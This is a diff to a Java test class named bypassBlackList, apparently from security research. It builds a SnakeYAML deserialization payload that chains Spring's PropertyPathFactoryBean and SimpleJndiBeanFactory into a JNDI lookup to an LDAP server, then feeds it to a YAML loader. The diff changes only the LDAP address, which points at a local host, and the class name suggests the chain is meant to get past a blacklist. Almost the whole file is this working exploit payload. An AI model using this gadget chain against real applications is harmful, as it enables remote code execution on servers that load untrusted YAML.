@@ -30,10 +30,10 @@ public class bypassBlackList {
 
     public static void main(String[] args) {
         String payload = "!<tag:yaml.org,2002:org.springframework.beans.factory.config.PropertyPathFactoryBean> \n" +
-                " targetBeanName: \"ldap://localhost:1389/Exploit\"\n" +
+                " targetBeanName: \"ldap://127.0.0.1:1389/aprvde\"\n" +
                 " propertyPath: Drunkbaby\n" +
                 " beanFactory: !<tag:yaml.org,2002:org.springframework.jndi.support.SimpleJndiBeanFactory> \n" +
-                "  shareableResources: [\"ldap://localhost:1389/Exploit\"]";
+                "  shareableResources: [\"ldap://127.0.0.1:1389/aprvde\"]";
         bypassTest bypassTest = new bypassTest();
         bypassTest.yamlLoads(payload);
     }
